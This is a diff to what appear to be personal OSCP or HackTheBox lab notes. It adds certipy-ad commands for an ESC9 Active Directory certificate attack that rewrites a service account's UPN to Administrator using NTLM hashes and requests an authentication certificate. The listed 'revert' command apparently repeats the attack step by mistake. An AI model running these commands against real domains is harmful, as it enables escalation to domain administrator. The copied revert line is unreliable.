@@ -13,6 +13,7 @@ const command = `certipy-ad find -u '[user]@${discoveredDomain}' -p 'Password' -
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Vulnerable Templates
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
@@ -150,3 +151,19 @@ certipy-ad template -dc-ip 10.129.232.128 -u ca_svc -hashes 3b181b914e7a9d5508ea
 certipy-ad req -ca sequel-DC01-CA -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
 ```
 
+---
+
+# ESC9
+
+```
+certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user CA_OPERATOR -upn Administrator -dc-ip 10.129.44.127
+```
+
+```
+certipy-ad req -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.44.127
+```
+
+MUST revert back to ca_operator
+```
+certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user CA_OPERATOR -upn Administrator -dc-ip 10.129.44.127
+```
